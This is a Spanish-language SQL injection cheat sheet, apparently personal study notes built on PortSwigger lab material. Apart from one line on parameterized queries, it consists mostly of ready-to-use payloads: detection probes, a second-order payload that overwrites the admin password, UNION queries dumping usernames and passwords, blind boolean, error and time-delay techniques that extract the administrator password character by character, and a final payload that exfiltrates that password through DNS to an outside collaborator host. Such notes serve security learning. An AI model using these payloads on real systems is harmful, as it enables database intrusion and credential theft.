# SQL Injection

Información obtenida de : 
> [SQL Injection](https://portswigger.net/web-security/sql-injection)

La inyección SQL (SQLi) es una vulnerabilidad de seguridad web que permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos.

En algunas situaciones, un atacante puede escalar un ataque de inyección SQL para comprometer el servidor subyacente u otra infraestructura de back-end, o realizar un ataque de denegación de servicio.

## Recursos útilies
- [SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [Aplication Security Testing: OAST, DAST, SAST](https://portswigger.net/burp/application-security-testing/oast)

## tipos de ataques:

- **Recuperación de datos ocultos**, donde puede modificar una consulta SQL para obtener resultados adicionales. 
- **Subvertir la lógica de la aplicación**, donde puede cambiar una consulta para interferir con la lógica de la aplicación. 
- **Ataques UNION**, donde puede recuperar datos de diferentes tablas de bases de datos. Mas detalles de [UNION atacks](https://portswigger.net/web-security/sql-injection/union-attacks).
- **Examinar la base de datos**, donde puede extraer información sobre la versión y la estructura de la base de datos. 
- **Inyección ciega de SQL**, donde los resultados de una consulta que usted controla no se devuelven en las respuestas de la aplicación


## Como detectar que una página web es vulnerable a sql injection

> `'`

> `ASCII(97)`

>`' OR 1=1 --`

>`; waitfor delay ('0:0:20') --`


## Second Order SQL Injection
La aplicación toma la entrada del usuario de una solicitud HTTP y la almacena para uso futuro.

> `admin' ; update users set password = 'letmein' where user='admin' --`

## Prevenir SQL injection 
La mayoría de las instancias de inyección SQL se pueden evitar mediante el uso de consultas parametrizadas (también conocidas como declaraciones preparadas) en lugar de la concatenación de cadenas dentro de la consulta.

## Comandos útiles

### Comandos Para realizar UNION ATTACKS

Para detectar la cantidad de columnas
> `' ORDER BY 1--`

Para Detectar las cantidad de columnas
> `' UNION SELECT NULL,NULL,NULL--`

Para Evalular el tipo de dato de cada columna (Este caso string)
> `' UNION SELECT 'a',NULL,NULL,NULL--`

Para obetener usuarios y contraseñas de la tabla users(si existe)
> `' UNION SELECT username, password FROM users--`

Concatenar la información en una columna
> `' UNION SELECT NULL,username || '~' || password FROM users--`


### Comandos para examinar la base de datos

Consultar tipo y version de la base de datos (con MYSQL y SQL SERVER)
> `' UNION SELECT @@version--`

Consultar tipo y version de la base de datos (con Oracle)
> `' UNION SELECT * from v$version--`

Consultar tipo y version de la base de datos (con PostgreSQL)
> `' UNION SELECT version()--`


**General:**
Obtener la estructura de tablas en la base de datos
> `SELECT * FROM information_schema.tables`

Esto regresa:
> `TABLE_CATALOG -- TABLE_SCHEMA -- TABLE_NAME -- TABLE_TYPE`

Obtener información detallada de tablas en la base de datos
> `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

Esto regresa:
> `TABLE_CATALOG -- TABLE_SCHEMA -- TABLE_NAME -- COLUMN_NAME -- DATA_TYPE`

**Para Oracle:**

Obtener la estructura de tablas en la base de datos (ORACLE)
> `SELECT * FROM all_tables`

Para ver todas las columnas que regresa
> https://docs.oracle.com/cd/B19306_01/server.102/b14237/statviews_2105.htm#REFRN20286

Algunas Son:
> `OWNER, TABLE_NAME, NUM_ROWS`

Obtener información detallada de tablas en la base de datos (ORACLE)
> `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

Para ver todas las columnas que regresa
> https://docs.oracle.com/cd/B19306_01/server.102/b14237/statviews_2094.html

Algunas Son:
> `COLUMN_NAME, DATA_TYPE, DATA_LENGTH`

### Comandos para ejecutar Blind SQLi 

Notas:
- Alguna veces se puede hacer uso de las cookies para ejecutar estos tipos de ataques.
- Se pueden encontrar mensajes como consecuencia de que se esta realizando correctamente el SQLi (Mensaje de bienvenida)
- Suelen ser usados para ejecutar comandos que retornan valores de verdadero o falso 


**Con efecto visual**
Verificar si se puede ejecutar un Blind SQLi tomando en cuenta que habrá un efecto en la página indirecto
> `' AND 1=1--`

> `' AND 1=0--`

Verificar si existe tabla `USERS`
>`'AND EXISTS (SELECT * FROM USERS)--`

Verificar si existe la columna `username` en tabla `USERS`
>`'AND EXISTS (SELECT username FROM USERS)--`

Verificar si existe la columna `Password` en tabla `USERS`
>`'AND EXISTS (SELECT Password FROM USERS)--`

Verificar si existe el usuario `administrator` en la tabla `USERS`
>`'AND EXISTS (SELECT Password FROM USERS WHERE username='administrator')--`

Verificar tamaño de la contraseña
>`'AND LENGTH((SELECT Password FROM USERS WHERE username='administrator')) > 1--`

Obtener la contraseña de un usuario administrador evaluando cada uno de los caracteres 
> `'AND SUBSTRING((SELECT Password FROM USERS WHERE username = 'administrator'), 1, 1) > 'a'--`


**Con efecto en status de respuesta** (Oracle)
Verificar si se puede generar el status 500
> `'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`

Verificar existencia de tabla
>`'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`

Verificar existencia de la columna `username`  NO FUNCIONA
>`'||(SELECT '' FROM users ORDER BY username WHERE ROWNUM = 1)||'`
>`'||(SELECT * FROM users WHERE EXISTS (SELECT USERNAME FROM users) )||'`

Verificar existencia de la columna `username`
>`'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='*')||'`

Verificar existencia del usuario `administrator`
>`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

Verificar tamaño de la contraseña
> `'|| (SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator') ||'`

Generar un error cuando la condición es correcta
> `'|| (SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') ||'`


### Comandos para realizar time delay en los SQLi

Probar Delay (SQL SERVER)
> `'; IF (1=1) WAITFOR DELAY '0:0:10'--`

Probar Delay (postgre)
> `'|| pg_sleep(10)--`

Delay con condición (Postgre)
> `'|| (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END) --`

Verificar si existe tabla `USERS`
> `'|| (SELECT CASE WHEN ( EXISTS (SELECT * FROM USERS) ) THEN pg_sleep(10) ELSE pg_sleep(0) END) --`

Verificar si existe columna `username`
> `'|| (SELECT CASE WHEN ( EXISTS (SELECT username FROM USERS) ) THEN pg_sleep(10) ELSE pg_sleep(0) END) --`

Evaluar contraseña  de `administrator` (PostreSQL)
> `'|| (SELECT CASE WHEN ( EXISTS (SELECT * FROM USERS WHERE username='administrator' AND SUBSTRING(Password, 1, 1) > '0') ) THEN pg_sleep(10) ELSE pg_sleep(0) END) --`

Evaluar contraseña  de `administrator` (SQL Server)
> `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

Generar búsqueda DNS 
> `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//burpsuitecollaborator.net/">+%25remote%3b]>'),'/l')+FROM+dual--`

Obtener Password mediante Busqueda DNS 
> `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.l7txexfyggyl2ej7lp6yn6j6kxqnec.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--`
